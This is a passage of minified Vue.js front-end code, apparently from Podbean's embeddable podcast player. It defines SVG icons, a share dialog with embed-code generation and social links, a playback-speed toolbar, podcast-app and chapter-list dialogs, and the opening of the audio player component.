            d: "M1355,443h-45v-85.9c0-18.1-1-29.9-2.9-35.3c-1.9-5.4-5-9.6-9.2-12.5c-4.3-2.9-9.4-4.4-15.4-4.4\n\t\tc-7.6,0-14.5,2.1-20.6,6.4c-6.1,4.3-10.3,9.9-12.5,16.8c-2.3,6.9-3.4,19.8-3.4,38.7V443h-44V275h41v24.5\n\t\tc14.6-19,33.1-28.5,55.3-28.5c9.9,0,18.9,1.8,27,5.3c8.1,3.5,14.3,8.1,18.5,13.6c4.2,5.5,7.1,11.8,8.7,18.7\n\t\tc1.6,6.9,2.4,16.9,2.4,29.8V443z"
          }
        })])]);
      },
      ce = [],
      le = {
        name: "IconPodbeanLogo"
      },
      de = le,
      pe = Object(Xt["a"])(de, ie, ce, !1, null, "62d312fb", null),
      ue = pe.exports,
      he = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("svg", {
          staticClass: "icon",
          attrs: {
            t: "1612343183943",
            viewBox: "0 0 1024 1024",
            version: "1.1",
            xmlns: "http://www.w3.org/2000/svg",
            "p-id": "10420",
            width: "200",
            height: "200"
          }
        }, [a("path", {
          attrs: {
            d: "M617.6 583.36c-32-30.72-74.56-47.68-120-47.68-93.44 0-169.6 73.28-169.6 162.88s76.16 162.88 169.6 162.88c45.12 0 87.68-16.96 120-47.68 32-30.72 49.6-71.68 49.6-115.2 0-43.2-17.6-84.16-49.6-115.2z m-120 200.96c-48.96 0-88.96-38.4-88.96-85.44s40-85.44 88.96-85.44 88.96 38.4 88.96 85.44c0.32 47.04-39.68 85.44-88.96 85.44z",
            fill: "#8BC53F",
            "p-id": "10421"
          }
        }), a("path", {
          attrs: {
            d: "M280 573.76c-9.6 0-19.2-2.56-27.52-7.68-23.68-14.4-30.4-43.84-15.04-65.92 27.84-40 66.24-73.6 111.04-96.96 46.08-24 98.56-36.8 151.68-36.8 83.52 0 162.24 30.4 221.44 85.76 15.68 14.72 29.76 30.72 41.6 48 15.36 22.08 8.64 51.52-15.04 65.92s-55.36 8-70.4-14.08c-8.32-11.84-17.6-22.4-28.16-32.32-39.68-37.12-92.8-57.92-149.12-57.92-71.68 0-137.92 33.6-177.28 90.24-10.24 14.08-26.56 21.76-43.2 21.76z",
            fill: "#8BC53F",
            opacity: ".8",
            "p-id": "10422"
          }
        }), a("path", {
          attrs: {
            d: "M887.36 488c-16.64 0-32.96-7.68-42.88-21.76-15.36-22.08-32.96-42.56-53.12-61.12-75.2-70.08-175.36-108.48-281.6-108.48-135.36 0-260.48 63.36-334.4 169.6-9.92 14.08-26.24 21.76-42.88 21.76-9.6 0-19.2-2.56-27.52-7.68-23.68-14.4-30.4-43.52-15.04-65.6 44.48-64 105.92-117.44 177.28-154.56C341.12 222.08 424.96 201.6 509.76 201.6c133.76 0 259.52 48.64 353.92 136.64 24.96 23.36 47.36 48.96 66.56 76.48 15.36 22.08 8.64 51.52-15.04 65.6-8.96 5.12-18.56 7.68-27.84 7.68z",
            fill: "#8BC53F",
            opacity: ".6",
            "p-id": "10423"
          }
        })]);
      },
      fe = [],
      me = {
        name: "icon-small-podbean-logo"
      },
      ge = me,
      ve = Object(Xt["a"])(ge, he, fe, !1, null, null, null),
      we = ve.exports,
      be = {
        name: "AppDownload",
        components: {
          IconSmallPodbeanLogo: we,
          IconPodbeanLogo: ue,
          IconClose: se
        },
        computed: Object(i["a"])(Object(i["a"])({}, Object(d["c"])(["setting"])), Object(d["b"])(["episode"])),
        methods: {
          close: function () {
            this.$store.commit(b, ["showAppDownloadStatus", 2]);
          }
        }
      },
      ye = be,
      ke = (a("e9d8"), Object(Xt["a"])(ye, Zt, te, !1, null, "6e372adc", null)),
      Ce = ke.exports,
      _e = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return t.episode ? a("div", {
          staticClass: "share-dialog common-dialog"
        }, [a("button", {
          staticClass: "close",
          on: {
            click: function (e) {
              return t.$emit("hide");
            }
          }
        }, [a("icon-close")], 1), a("div", {
          staticClass: "share-content"
        }, [a("div", {
          staticClass: "copy-code"
        }, [a("div", {
          staticClass: "form link-code "
        }, [a("div", {
          staticClass: "title_panel"
        }, [t._v(t._s(t.linkOrCodeName) + ":")]), a("input", {
          ref: "input",
          staticClass: "input_link",
          attrs: {
            title: t.linkOrCodeTitle,
            type: "text"
          },
          domProps: {
            value: t.linkOrCodeContent
          },
          on: {
            click: function (e) {
              return t.select(e);
            }
          }
        }), a("a", {
          directives: [{
            name: "clipboard",
            rawName: "v-clipboard:copy",
            value: t.linkOrCodeContent,
            expression: "linkOrCodeContent",
            arg: "copy"
          }, {
            name: "clipboard",
            rawName: "v-clipboard:success",
            value: t.onCopy,
            expression: "onCopy",
            arg: "success"
          }, {
            name: "clipboard",
            rawName: "v-clipboard:error",
            value: t.onError,
            expression: "onError",
            arg: "error"
          }],
          staticClass: "btn copy",
          attrs: {
            href: "javascript:void(0);"
          }
        }, [t._v("Copy")])]), a("div", {
          staticClass: "icon-group form d-flex"
        }, [a("a", {
          staticClass: "btn embed link",
          attrs: {
            href: "javascript:;",
            title: "Episode Link"
          },
          on: {
            click: t.showLink
          }
        }, [a("icon-link")], 1), a("a", {
          staticClass: "btn embed",
          attrs: {
            href: "javascript:;",
            title: "Embed Code"
          },
          on: {
            click: t.showCode
          }
        }, [a("icon-code")], 1), a("a", {
          staticClass: "btn subscribe",
          attrs: {
            href: t.$store.state.setting.subscribeLink,
            target: "_blank",
            title: "RSS Feed"
          }
        }, [a("icon-subscribe")], 1), t.tmpDisableAddThis ? t._e() : a("ul", {
          staticClass: "iconlist clearfix"
        }, [a("li", [a("ShareNetwork", {
          attrs: {
            network: "facebook",
            url: t.episode.shareLink || t.episode.link,
            title: t.episode.title,
            description: t.episode.title,
            quote: t.episode.title
          }
        }, [a("span", [a("a", [a("i", {
          staticClass: "pbicon pbFont-facebook1"
        })])])])], 1), a("li", [a("ShareNetwork", {
          attrs: {
            network: "twitter",
            url: t.episode.shareLink || t.episode.link,
            title: t.episode.title,
            description: t.episode.title,
            quote: t.episode.title
          }
        }, [a("span", [a("a", [a("i", {
          staticClass: "pbicon pbFont-twitterlogo"
        })])])])], 1), a("li", [a("ShareNetwork", {
          attrs: {
            network: "linkedin",
            url: t.episode.shareLink || t.episode.link,
            title: t.episode.title,
            description: t.episode.title,
            quote: t.episode.title
          }
        }, [a("span", [a("a", [a("i", {
          staticClass: "pbicon pbFont-linkedin2"
        })])])])], 1), a("li", [a("ShareNetwork", {
          attrs: {
            network: "tumblr",
            url: t.episode.shareLink || t.episode.link,
            title: t.episode.title,
            description: t.episode.title,
            quote: t.episode.title
          }
        }, [a("span", [a("a", [a("i", {
          staticClass: "pbicon pbFont-tumblr2"
        })])])])], 1), a("li", [a("ShareNetwork", {
          attrs: {
            network: "vk",
            url: t.episode.shareLink || t.episode.link,
            title: t.episode.title,
            description: t.episode.title,
            quote: t.episode.title
          }
        }, [a("span", [a("a", [a("i", {
          staticClass: "pbicon pbFont-vk2"
        })])])])], 1)])])])]), t.setting.pbad ? a("a", {
          staticClass: "podbean-logo",
          attrs: {
            href: "http://www.podbean.com?utm_campaign=pb_web_audio_player&utm_medium=app_download&utm_source=pb_web_player",
            target: "_blank"
          }
        }, [a("icon-podbean-logo")], 1) : t._e()]) : t._e();
      },
      xe = [],
      Pe = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("svg", {
          staticClass: "bi bi-code-square",
          attrs: {
            xmlns: "http://www.w3.org/2000/svg",
            width: "22",
            height: "22",
            fill: "currentColor",
            viewBox: "0 0 16 16"
          }
        }, [a("path", {
          attrs: {
            d: "M14 1a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1h12zM2 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H2z"
          }
        }), a("path", {
          attrs: {
            d: "M6.854 4.646a.5.5 0 0 1 0 .708L4.207 8l2.647 2.646a.5.5 0 0 1-.708.708l-3-3a.5.5 0 0 1 0-.708l3-3a.5.5 0 0 1 .708 0zm2.292 0a.5.5 0 0 0 0 .708L11.793 8l-2.647 2.646a.5.5 0 0 0 .708.708l3-3a.5.5 0 0 0 0-.708l-3-3a.5.5 0 0 0-.708 0z"
          }
        })]);
      },
      Se = [],
      Oe = {
        name: "IconCode"
      },
      Ee = Oe,
      Te = Object(Xt["a"])(Ee, Pe, Se, !1, null, null, null),
      je = Te.exports,
      Le = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("svg", {
          staticClass: "icon",
          attrs: {
            t: "1611573562875",
            fill: "currentColor",
            viewBox: "0 0 1024 1024",
            version: "1.1",
            xmlns: "http://www.w3.org/2000/svg",
            "p-id": "10174",
            width: "14",
            height: "14"
          }
        }, [a("path", {
          attrs: {
            d: "M329.143 768q0 45.714-32 77.714t-77.714 32-77.715-32-32-77.714 32-77.714 77.715-32 77.714 32 32 77.714z m292.571 70.286q1.143 16-9.714 27.428-10.286 12-26.857 12H508q-14.286 0-24.571-9.428T472 844.57q-12.571-130.857-105.429-223.714T142.857 515.43q-14.286-1.143-23.714-11.429t-9.429-24.571v-77.143q0-16.572 12-26.857 9.715-9.715 24.572-9.715h2.857q91.428 7.429 174.857 46T472 515.43q65.143 64.571 103.714 148t46 174.857z m292.572 1.143q1.143 15.428-10.286 26.857-10.286 11.428-26.286 11.428H796q-14.857 0-25.429-10T759.43 843.43Q752.57 720.57 701.714 610T569.43 418t-192-132.286T144 227.43q-14.286-0.572-24.286-11.143t-10-24.857v-81.715q0-16 11.429-26.285 10.286-10.286 25.143-10.286H148q149.714 7.428 286.571 68.571t243.143 168q106.857 106.286 168 243.143t68.572 286.572z",
            "p-id": "10175"
          }
        })]);
      },
      Ae = [],
      De = {
        name: "icon-subscribe"
      },
      Me = De,
      Re = Object(Xt["a"])(Me, Le, Ae, !1, null, null, null),
      $e = Re.exports,
      Ie = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("svg", {
          staticClass: "icon",
          attrs: {
            t: "1611633582917",
            fill: "currentColor",
            viewBox: "0 0 1024 1024",
            version: "1.1",
            xmlns: "http://www.w3.org/2000/svg",
            "p-id": "10206",
            width: "200",
            height: "200"
          }
        }, [a("path", {
          attrs: {
            d: "M896 64c38.4 0 64 25.6 64 64v768c0 38.4-25.6 64-64 64H128c-38.4 0-64-25.6-64-64V128c0-38.4 25.6-64 64-64h768zM128 0C57.6 0 0 57.6 0 128v768c0 70.4 57.6 128 128 128h768c70.4 0 128-57.6 128-128V128c0-70.4-57.6-128-128-128H128z",
            "p-id": "10207"
          }
        }), a("path", {
          attrs: {
            d: "M364.8 812.8c-38.4 0-76.8-12.8-102.4-44.8-57.6-57.6-57.6-153.6 0-217.6l76.8-76.8 51.2 51.2-76.8 76.8c-32 32-32 76.8 0 102.4 32 32 76.8 32 102.4 0l102.4-102.4c12.8-12.8 25.6-32 25.6-51.2 0-19.2-6.4-38.4-19.2-51.2l-38.4-38.4 51.2-51.2 44.8 38.4c25.6 25.6 44.8 64 44.8 102.4s-19.2 83.2-51.2 108.8l-102.4 102.4c-32 32-70.4 51.2-108.8 51.2z",
            "p-id": "10208"
          }
        }), a("path", {
          attrs: {
            d: "M486.4 614.4l-44.8-32c-57.6-64-57.6-160 0-217.6l102.4-102.4c57.6-57.6 153.6-57.6 217.6 0s57.6 153.6 0 217.6l-76.8 76.8-51.2-57.6 76.8-76.8c32-32 32-76.8 0-102.4-32-32-76.8-32-102.4 0L499.2 416c-32 32-32 76.8 0 108.8l44.8 44.8-57.6 44.8z",
            "p-id": "10209"
          }
        })]);
      },
      Be = [],
      ze = {
        name: "icon-link"
      },
      qe = ze,
      He = Object(Xt["a"])(qe, Ie, Be, !1, null, null, null),
      Ne = He.exports,
      Ue = {
        name: "ShareDialog",
        components: {
          IconPodbeanLogo: ue,
          IconClose: se,
          IconLink: Ne,
          IconSubscribe: $e,
          IconCode: je
        },
        mounted: function () {},
        computed: Object(i["a"])(Object(i["a"])(Object(i["a"])({}, Object(d["b"])(["episode"])), Object(d["c"])(["setting"])), {}, {
          showCompact: function () {
            return window.innerHeight > 400;
          },
          embedCode: function () {
            var t = document.createElement("iframe");
            t.setAttribute("title", this.episode.title), "public" !== this.episode.protectedLevel && t.setAttribute("referrerPolicy", "no-referrer-when-downgrade");
            var e = "100%",
              a = "150";
            return 1 === this.$store.state.square ? a = 400 : "video" === this.episode.type ? a = 480 : this.$store.state.episodes.length > 1 && (a = 315), t.setAttribute("height", a), t.setAttribute("width", e), t.setAttribute("style", "border: none;"), t.setAttribute("scrolling", "no"), t.setAttribute("data-name", "pb-iframe-player"), t.setAttribute("src", window.location.href), t.setAttribute("allowfullscreen", ""), t.outerHTML.replace(/&amp;/g, "&");
          }
        }),
        watch: {
          episode: function () {
            var t = this;
            return Object(s["a"])(regeneratorRuntime.mark(function e() {
              return regeneratorRuntime.wrap(function (e) {
                while (1) switch (e.prev = e.next) {
                  case 0:
                    return t.linkOrCodeContent = t.episode.shareLink || t.episode.link, t.tmpDisableAddThis = !0, e.next = 4, Et(100);
                  case 4:
                    return t.tmpDisableAddThis = !1, e.next = 7, t.$nextTick();
                  case 7:
                    window.addthis && window.addthis.toolbox(".addthis_toolbox");
                  case 8:
                  case "end":
                    return e.stop();
                }
              }, e);
            }))();
          }
        },
        data: function () {
          return {
            linkOrCodeContent: "",
            linkOrCodeTitle: "Episode link",
            linkOrCodeName: "Link",
            tmpDisableAddThis: !1
          };
        },
        created: function () {
          this.linkOrCodeContent = this.episode.shareLink || this.episode.link;
        },
        methods: {
          onCopy: function () {
            this.$toasted.show("Copied", {
              position: "bottom-center",
              duration: 2e3
            });
          },
          onError: function () {
            this.$toasted.show("Copy failed. Please manual copy it.", {
              position: "bottom-center",
              duration: 2e3
            });
          },
          select: function (t) {
            t.target.select();
          },
          showLink: function () {
            this.linkOrCodeContent = this.episode.shareLink || this.episode.link, this.linkOrCodeTitle = "Episode link", this.linkOrCodeName = "Link";
          },
          showCode: function () {
            this.linkOrCodeContent = this.embedCode, this.linkOrCodeTitle = "Embed link", this.linkOrCodeName = "Embed";
          }
        }
      },
      Fe = Ue,
      Ve = (a("5ac6"), Object(Xt["a"])(Fe, _e, xe, !1, null, "f4ce1542", null)),
      We = Ve.exports,
      Ge = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("div", {
          staticClass: "player-double-speed"
        }, [a("button", {
          staticClass: "btn btn-link left-square",
          attrs: {
            tabindex: "0",
            type: "button"
          },
          on: {
            click: function (e) {
              return t.$emit("seekBackward");
            }
          }
        }, [a("svg", {
          staticClass: "icon",
          attrs: {
            t: "1612233834299",
            fill: "currentColor",
            viewBox: "0 0 1024 1024",
            version: "1.1",
            xmlns: "http://www.w3.org/2000/svg",
            "p-id": "10176",
            width: "200",
            height: "200"
          }
        }, [a("path", {
          attrs: {
            d: "M339.968 195.584l-141.824-45.056L229.888 5.12l33.792 58.88C337.408 23.04 421.888 0 512 0c282.624 0 512 229.376 512 512s-229.376 512-512 512S0 794.624 0 512c0-46.08 6.144-90.624 17.408-133.12l77.312 20.48c-9.728 35.84-14.848 73.728-14.848 112.64 0 238.592 193.536 432.128 432.128 432.128s432.128-193.536 432.128-432.128-193.536-432.128-432.128-432.128c-75.264 0-146.432 19.456-207.872 53.248l35.84 62.464z",
            "p-id": "10177"
          }
        }), a("path", {
          attrs: {
            d: "M418.304 330.24v356.864H364.032v-291.84c-22.016 20.48-49.152 35.84-81.92 45.056V386.56c15.872-4.096 32.768-10.752 51.2-20.992 17.92-11.264 32.768-23.04 44.032-35.328h40.96zM512 330.24h215.04v48.128h-171.008L545.28 481.28h1.536c10.752-11.264 23.552-19.456 37.888-24.576 12.8-5.12 27.136-8.192 44.032-8.192 33.792 0 60.928 10.752 81.92 32.768 21.504 22.528 31.744 52.736 31.744 90.624 0 36.864-13.824 67.072-40.96 90.624-25.088 20.992-55.808 31.744-91.648 31.744-31.744 0-59.392-8.704-82.432-26.624-25.088-18.944-39.424-45.056-41.984-78.336h53.248c2.048 20.48 9.728 35.328 23.552 45.568 11.776 9.216 28.16 13.312 48.128 13.312 21.504 0 39.936-6.656 55.296-20.48 14.848-13.824 22.528-32.256 22.528-54.784 0-25.088-6.656-44.544-19.456-58.368s-31.232-20.992-54.784-20.992c-16.384 0-30.208 3.072-41.472 8.704-12.8 5.632-22.528 15.36-29.696 28.672H491.52l20.48-200.704z",
            "p-id": "10178"
          }
        })])]), t.episode.enableSpeed ? a("button", {
          staticClass: "btn btn-link double-speed",
          attrs: {
            tabindex: "0",
            type: "button"
          },
          on: {
            click: t.changeRate
          }
        }, [t._v(t._s(t.rateTexts[t.rateIndex]))]) : t._e(), a("button", {
          staticClass: "btn btn-link right-square",
          attrs: {
            tabindex: "0",
            type: "button"
          },
          on: {
            click: function (e) {
              return t.$emit("seekForward");
            }
          }
        }, [a("svg", {
          staticClass: "icon",
          attrs: {
            t: "1612232411279",
            fill: "currentColor",
            viewBox: "0 0 1024 1024",
            version: "1.1",
            xmlns: "http://www.w3.org/2000/svg",
            "p-id": "10145",
            width: "200",
            height: "200"
          }
        }, [a("path", {
          attrs: {
            d: "M719.953 133.253C658.263 99.31 587.386 80 512 80 273.413 80 80 273.413 80 512s193.413 432 432 432 432-193.413 432-432c0-38.94-5.152-76.676-14.812-112.565l77.395-20.335C1017.943 421.482 1024 466.034 1024 512c0 282.77-229.23 512-512 512S0 794.77 0 512 229.23 0 512 0c89.96 0 174.502 23.201 247.967 63.946L794 5l31.603 145.263L684 195.526l35.953-62.273zM418.5 330v357H364V395.5c-22 20.667-49.333 35.667-82 45v-54c16-4 33-11 51-21 18-11.333 32.667-23.167 44-35.5h41.5z m93.333 0h215v48h-171l-10.5 103h1.5c11-11.333 23.667-19.5 38-24.5 12.667-5.333 27.334-8 44-8 33.667 0 61 11 82 33 21.334 22.333 32 52.5 32 90.5 0 36.667-13.666 66.833-41 90.5-25.333 21-55.833 31.5-91.5 31.5-31.666 0-59.166-8.833-82.5-26.5-25.333-19-39.333-45.167-42-78.5h53.5c2 20.333 9.834 35.5 23.5 45.5 12 9 28 13.5 48 13.5 21.667 0 40.167-6.833 55.5-20.5 15-14 22.5-32.333 22.5-55 0-25-6.5-44.5-19.5-58.5s-31.333-21-55-21c-16.333 0-30.166 2.833-41.5 8.5-12.666 5.667-22.5 15.167-29.5 28.5h-51l19.5-200z",
            "p-id": "10146"
          }
        })])])]);
      },
      Ke = [],
      Je = {
        name: "PlayerToolbar",
        data: function () {
          return {
            rateIndex: this.$store.state.playbackRateIndex,
            rates: [.8, 1, 1.2, 1.5, 2],
            rateTexts: ["0.8", "1x", "1.2", "1.5", "2x"]
          };
        },
        computed: Object(i["a"])({}, Object(d["b"])(["episode"])),
        methods: {
          changeRate: function () {
            this.rateIndex + 1 >= this.rates.length ? this.rateIndex = 0 : this.rateIndex++, this.$store.commit(b, ["playbackRate", this.rates[this.rateIndex]]), this.$store.commit(b, ["playbackRateIndex", this.rateIndex]);
          }
        }
      },
      Xe = Je,
      Ye = (a("95a8"), Object(Xt["a"])(Xe, Ge, Ke, !1, null, "d28a57da", null)),
      Qe = Ye.exports,
      Ze = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("svg", {
          staticClass: "icon icon-download",
          attrs: {
            t: "1615450658517",
            fill: "currentColor",
            viewBox: "0 0 1024 1024",
            version: "1.1",
            xmlns: "http://www.w3.org/2000/svg",
            "p-id": "10970",
            width: "200",
            height: "200"
          }
        }, [a("path", {
          attrs: {
            d: "M855.087 932.521H168.913c-20.435 0-37-16.565-37-37v-616c0-20.435 16.565-37 37-37H284.9c20.435 0 37 16.565 37 37s-16.565 37-37 37h-78.987v542h612.174v-542H739.1c-20.435 0-37-16.565-37-37s16.565-37 37-37h115.987c20.435 0 37 16.565 37 37v616c0 20.435-16.566 37-37 37z",
            "p-id": "10971"
          }
        }), a("path", {
          attrs: {
            d: "M511.695 626.782c-20.435 0-37-16.565-37-37V128.478c0-20.435 16.565-37 37-37s37 16.565 37 37v461.304c0 20.435-16.565 37-37 37z",
            "p-id": "10972"
          }
        }), a("path", {
          attrs: {
            d: "M511.68 626.783a36.856 36.856 0 0 1-24.251-9.07c-15.426-13.402-17.066-36.771-3.664-52.197l95.305-109.695c13.402-15.426 36.771-17.066 52.197-3.664s17.066 36.771 3.664 52.197l-95.305 109.695c-7.316 8.421-17.604 12.734-27.946 12.734z",
            "p-id": "10973"
          }
        }), a("path", {
          attrs: {
            d: "M512.016 626.783c-10.344 0-20.63-4.313-27.946-12.734l-95.305-109.695c-13.402-15.426-11.762-38.795 3.664-52.197s38.797-11.762 52.197 3.664l95.305 109.695c13.402 15.426 11.762 38.795-3.664 52.197a36.863 36.863 0 0 1-24.251 9.07z",
            "p-id": "10974"
          }
        })]);
      },
      ta = [],
      ea = {
        name: "icon-download"
      },
      aa = ea,
      oa = Object(Xt["a"])(aa, Ze, ta, !1, null, null, null),
      na = oa.exports,
      ra = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("svg", {
          staticClass: "bi bi-share-fill",
          attrs: {
            xmlns: "http://www.w3.org/2000/svg",
            width: "16",
            height: "16",
            fill: "currentColor",
            viewBox: "0 0 16 16"
          }
        }, [a("path", {
          attrs: {
            d: "M11 2.5a2.5 2.5 0 1 1 .603 1.628l-6.718 3.12a2.499 2.499 0 0 1 0 1.504l6.718 3.12a2.5 2.5 0 1 1-.488.876l-6.718-3.12a2.5 2.5 0 1 1 0-3.256l6.718-3.12A2.5 2.5 0 0 1 11 2.5z"
          }
        })]);
      },
      sa = [],
      ia = {
        name: "icon-share"
      },
      ca = ia,
      la = Object(Xt["a"])(ca, ra, sa, !1, null, null, null),
      da = la.exports,
      pa = function () {
        var t = this,
          e = t.$createElement;
        t._self._c;
        return t._m(0);
      },
      ua = [function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("div", {
          staticClass: "player-loading"
        }, [a("div", {
          staticClass: "item"
        }), a("div", {
          staticClass: "item"
        }), a("div", {
          staticClass: "item"
        })]);
      }],
      ha = {
        name: "PlayerLoading"
      },
      fa = ha,
      ma = (a("5a17"), Object(Xt["a"])(fa, pa, ua, !1, null, "98590efa", null)),
      ga = ma.exports,
      va = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("svg", {
          staticClass: "icon",
          attrs: {
            t: "1618986374671",
            viewBox: "0 0 1024 1024",
            version: "1.1",
            fill: "currentColor",
            xmlns: "http://www.w3.org/2000/svg",
            "p-id": "12409",
            width: "18",
            height: "18"
          }
        }, [a("path", {
          attrs: {
            d: "M329.143 768q0 45.714-32 77.714t-77.714 32-77.715-32-32-77.714 32-77.714 77.715-32 77.714 32 32 77.714z m292.571 70.286q1.143 16-9.714 27.428-10.286 12-26.857 12H508q-14.286 0-24.571-9.428T472 844.57q-12.571-130.857-105.429-223.714T142.857 515.43q-14.286-1.143-23.714-11.429t-9.429-24.571v-77.143q0-16.572 12-26.857 9.715-9.715 24.572-9.715h2.857q91.428 7.429 174.857 46T472 515.43q65.143 64.571 103.714 148t46 174.857z m292.572 1.143q1.143 15.428-10.286 26.857-10.286 11.428-26.286 11.428H796q-14.857 0-25.429-10T759.43 843.43Q752.57 720.57 701.714 610T569.43 418t-192-132.286T144 227.43q-14.286-0.572-24.286-11.143t-10-24.857v-81.715q0-16 11.429-26.285 10.286-10.286 25.143-10.286H148q149.714 7.428 286.571 68.571t243.143 168q106.857 106.286 168 243.143t68.572 286.572z",
            "p-id": "12410"
          }
        })]);
      },
      wa = [],
      ba = {
        name: "IconRss"
      },
      ya = ba,
      ka = Object(Xt["a"])(ya, va, wa, !1, null, "30761fd8", null),
      Ca = ka.exports,
      _a = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("div", {
          staticClass: "share-dialog common-dialog subscribe-dialog"
        }, [a("button", {
          staticClass: "close",
          on: {
            click: function (e) {
              return t.$emit("hide");
            }
          }
        }, [a("icon-close")], 1), a("div", {
          staticClass: "row no-gutters share-content"
        }, [t._l(t.listPodcastApps, function (e) {
          return a("div", {
            key: e.name,
            staticClass: "list"
          }, [a("a", {
            staticClass: "app-item",
            attrs: {
              href: e.link,
              target: "_blank"
            }
          }, [a("img", {
            attrs: {
              src: e.image
            }
          }), a("span", [t._v(t._s(e.name))])])]);
        }), t.showMoreAppsBtn ? a("a", {
          staticClass: "more list",
          attrs: {
            href: t.rssPageLink,
            target: "_blank"
          }
        }, [a("svg", {
          staticClass: "bi bi-plus",
          attrs: {
            xmlns: "http://www.w3.org/2000/svg",
            width: "24",
            height: "24",
            fill: "currentColor",
            viewBox: "0 0 16 16"
          }
        }, [a("path", {
          attrs: {
            d: "M8 4a.5.5 0 0 1 .5.5v3h3a.5.5 0 0 1 0 1h-3v3a.5.5 0 0 1-1 0v-3h-3a.5.5 0 0 1 0-1h3v-3A.5.5 0 0 1 8 4z"
          }
        })]), a("span", [t._v("More Apps")])]) : t._e()], 2)]);
      },
      xa = [],
      Pa = {
        name: "PodcastAppsDialog",
        components: {
          IconClose: se
        },
        computed: Object(i["a"])(Object(i["a"])({}, Object(d["c"])(["podcastApps", "rssPageLink"])), {}, {
          listPodcastApps: function () {
            return this.podcastApps.slice(0, 5);
          },
          showMoreAppsBtn: function () {
            return this.podcastApps.length > 5;
          }
        }),
        methods: {}
      },
      Sa = Pa,
      Oa = (a("558a"), Object(Xt["a"])(Sa, _a, xa, !1, null, "94168bae", null)),
      Ea = Oa.exports,
      Ta = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("div", {
          staticClass: "common-dialog chapters-List-dialog"
        }, [a("button", {
          staticClass: "close",
          on: {
            click: function (e) {
              return t.$emit("hide");
            }
          }
        }, [a("icon-close")], 1), a("div", {
          staticClass: "row no-gutters share-content"
        }, t._l(t.chapters, function (e) {
          return a("div", {
            key: e.startTime,
            staticClass: "list"
          }, [a("a", {
            staticClass: "app-item",
            attrs: {
              href: "javascript:;"
            },
            on: {
              click: function (a) {
                return t.chapterGoTo(e.startTime);
              }
            }
          }, [a("span", {
            staticClass: "time"
          }, [t._v(t._s(t._f("formatDuration")(e.startTime)))]), t._v(" "), a("span", {
            staticClass: "title"
          }, [t._v(t._s(e.title))])])]);
        }), 0)]);
      },
      ja = [],
      La = {
        name: "ChaptersListDialog",
        components: {
          IconClose: se
        },
        computed: Object(i["a"])({}, Object(d["c"])(["chapters"])),
        methods: {
          chapterGoTo: function (t) {
            this.$emit("seek-to-chapter-time", t);
          }
        }
      },
      Aa = La,
      Da = (a("fda5"), Object(Xt["a"])(Aa, Ta, ja, !1, null, "e72a2c92", null)),
      Ma = Da.exports,
      Ra = function () {
        var t = this,
          e = t.$createElement,
          a = t._self._c || e;
        return a("svg", {
          staticClass: "icon",
          attrs: {
            t: "1678439763815",
            fill: "currentColor",
            viewBox: "0 0 1024 1024",
            version: "1.1",
            xmlns: "http://www.w3.org/2000/svg",
            "p-id": "15873",
            width: "16",
            height: "16"
          }
        }, [a("path", {
          attrs: {
            d: "M114.41152 92.29312c-52.90496 0-95.86688 42.96704-95.86688 95.86688 0 52.91008 42.96192 95.86688 95.86688 95.86688 52.89984 0 95.86688-42.9568 95.86688-95.86688-0.00512-52.89984-42.96704-95.86688-95.86688-95.86688zM336.80896 259.16928h602.07104c36.74624 0 66.57536-31.77472 66.57536-71.00928s-29.82912-71.00928-66.57536-71.00928H336.80896c-36.75648 0-66.57536 31.77472-66.57536 71.00928s29.81888 71.00928 66.57536 71.00928zM114.41152 416.13312c-52.90496 0-95.86688 42.96704-95.86688 95.86688 0 52.91008 42.96192 95.86688 95.86688 95.86688 52.89984 0 95.86688-42.9568 95.86688-95.86688-0.00512-52.89984-42.96704-95.86688-95.86688-95.86688zM938.88 440.99072H336.80896c-36.75648 0-66.57536 31.77472-66.57536 71.00928s29.81888 71.00928 66.57536 71.00928h602.07104c36.74624 0 66.57536-31.77472 66.57536-71.00928s-29.82912-71.00928-66.57536-71.00928zM114.41152 739.97312c-52.90496 0-95.86688 42.96704-95.86688 95.86688 0 52.91008 42.96192 95.86688 95.86688 95.86688 52.89984 0 95.86688-42.9568 95.86688-95.86688-0.00512-52.89984-42.96704-95.86688-95.86688-95.86688zM938.88 764.83072H336.80896c-36.75648 0-66.57536 31.77472-66.57536 71.00928s29.81888 71.00928 66.57536 71.00928h602.07104c36.74624 0 66.57536-31.77472 66.57536-71.00928s-29.82912-71.00928-66.57536-71.00928z",
            "p-id": "15874"
          }
        })]);
      },
      $a = [],
      Ia = {
        name: "IconListChapers"
      },
      Ba = Ia,
      za = Object(Xt["a"])(Ba, Ra, $a, !1, null, null, null),
      qa = za.exports,
      Ha = {
        name: "AudioPlayer",
        components: {
          IconListChapers: qa,
          ChaptersListDialog: Ma,
          PodcastAppsDialog: Ea,
          IconRss: Ca,
          PlayerLoading: ga,
          IconPodbeanLogo: ue,
          IconShare: da,
          IconDownload: na,
          PlayerToolbar: Qe,
          ShareDialog: We,
          AppDownload: Ce,
          PbPlayer: Qt
        },
        computed: Object(i["a"])(Object(i["a"])(Object(i["a"])({}, Object(d["c"])(["setting", "startAt", "download", "share", "logoLink", "showAppDownloadStatus", "podcastApps", "chapters"])), Object(d["b"])(["episode"])), {}, {
          logoUrl: function () {
            return "episode_page" == this.logoLink ? this.episode.link : "podcast_page" == this.logoLink ? this.setting.podcastLink : "";
          },
          videoOptions: function () {
            return {
              language: "en",
              autoplay: !1,
              controls: !0,
              controlBar: {
                fullscreenToggle: !1,
                durationDisplay: !1,
                mouseTimeDisplay: !1,
